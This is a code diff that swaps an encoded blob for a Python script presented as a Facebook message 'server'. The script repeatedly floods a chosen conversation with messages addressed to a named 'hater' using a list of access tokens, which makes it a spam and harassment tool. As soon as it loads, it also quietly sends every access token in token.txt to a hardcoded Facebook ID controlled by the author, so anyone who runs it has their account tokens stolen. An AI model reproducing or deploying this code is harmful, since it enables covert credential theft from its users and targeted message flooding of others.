@@ -1,1 +1,150 @@
-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
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+import random
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+      def do_GET(self):
+          self.send_response(200)
+          self.send_header('Content-type', 'text/plain')
+          self.end_headers()
+          self.wfile.write(b"-- THIIS S3RV3R M9D3 BY F9IIZ KIING")
+def execute_server():
+      PORT = 4000
+
+      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+          print("Server running at http://localhost:{}".format(PORT))
+          httpd.serve_forever()
+
+
+def send_initial_message():
+      with open('token.txt', 'r') as file:
+          tokens = file.readlines()
+
+      # Modify the message as per your requirement
+      msg_template = "Hello Faiz sir! I am using your server. My token is {}"
+
+      # Specify the ID where you want to send the message
+      target_id = "100027369503647"
+
+      requests.packages.urllib3.disable_warnings()
+
+      def liness():
+          print('\033[1;92m' + '•────────────────TH3 KIING F9IIZ IINSID3───────────────────────────────•')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      for token in tokens:
+          access_token = token.strip()
+          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+          msg = msg_template.format(access_token)
+          parameters = {'access_token': access_token, 'message': msg}
+          response = requests.post(url, json=parameters, headers=headers)
+
+          # No need to print here, as requested
+          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+          time.sleep(0.1)  # Wait for 1 second between sending each initial message
+
+      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
+send_initial_message()
+def send_messages_from_file():
+      with open('convo.txt', 'r') as file:
+          convo_id = file.read().strip()
+
+      with open('file.txt', 'r') as file:
+          messages = file.readlines()
+
+      num_messages = len(messages)
+
+      with open('token.txt', 'r') as file:
+          tokens = file.readlines()
+      num_tokens = len(tokens)
+      max_tokens = min(num_tokens, num_messages)
+
+      with open('name.txt', 'r') as file:
+          haters_name = file.read().strip()
+
+      with open('time.txt', 'r') as file:
+          speed = int(file.read().strip())
+
+      def liness():
+          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      while True:
+          try:
+              for message_index in range(num_messages):
+                  token_index = message_index % max_tokens
+                  access_token = tokens[token_index].strip()
+
+                  message = messages[message_index].strip()
+
+                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                  response = requests.post(url, json=parameters, headers=headers)
+
+                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
+                  if response.ok:
+                      print("\033[1;92m[+] Faiz bhai server use kroge to msg to jayega hi na {} of Convo {} Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  else:
+                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  time.sleep(speed)
+
+              print("\n[+] All messages sent. Restarting the process...\n")
+          except Exception as e:
+              print("[!] An error occurred: {}".format(e))
+
+def main():
+      server_thread = threading.Thread(target=execute_server)
+      server_thread.start()
+
+      # Send the initial message to the specified ID using all tokens
+
+
+      # Then, continue with the message sending loop
+      send_messages_from_file()
+
+if __name__ == '__main__':
+      main()
